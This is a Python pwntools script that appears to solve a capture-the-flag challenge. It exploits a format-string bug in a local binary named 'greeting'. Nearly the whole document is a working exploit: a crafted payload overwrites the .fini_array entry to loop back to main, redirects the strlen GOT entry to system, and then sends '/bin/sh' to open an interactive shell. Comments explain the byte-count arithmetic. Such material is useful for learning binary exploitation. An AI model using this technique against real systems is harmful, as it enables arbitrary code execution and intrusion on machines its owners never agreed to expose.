from pwn import *

target = process('./greeting')
# gdb.attach(target, gdbscript = 'b *0x0804864f')

# objdump -D greeting | grep .fini_array
fini_array_addr = 0x08049934
# objdump -R greeting | grep strlen
strlen_got_addr = 0x08049a54


payload = b"xx" 
payload += p32(fini_array_addr) # Break writes into parts
payload += p32(fini_array_addr + 2)
payload += p32(strlen_got_addr)
payload += p32(strlen_got_addr + 2)
payload += b"%33900x%14$n"
payload += b"%349x%12$n"
payload += b"%33303x%13$n%15$n"

print(f"Payload len {hex(len(payload))}")

target.sendline(payload)
target.sendline(b'/bin/sh')

target.interactive()

# Format string count starts at 0x24
# Need to overwrite fini_array with 0x80485ed (main)
# write 0x85ed - 0x24 = 0x85c9 bytes ie 34249
# write 0x10804 - 0x85ed = 33303
# Loop to main works
# check x/x 0x8049934


# Need to overwrite strlen with system 
# objdump -R greeting | grep system GOT didn't work. Trying PLT
# objdump -D greeting | grep system
# system is 0x08048490. Top 4 bytes match main. Can save time
# check x/x 0x8049a54

#write 0x8490 - 0x24 = 0x846c bytes ie 33900 to 14th param
#write 0x85ed - 0x8490 = 0x15d bytes ie 349 to 12th param
#write 0x10804 - 0x85ed = 0x8217 bytes ie 33303 to 13th and 15th param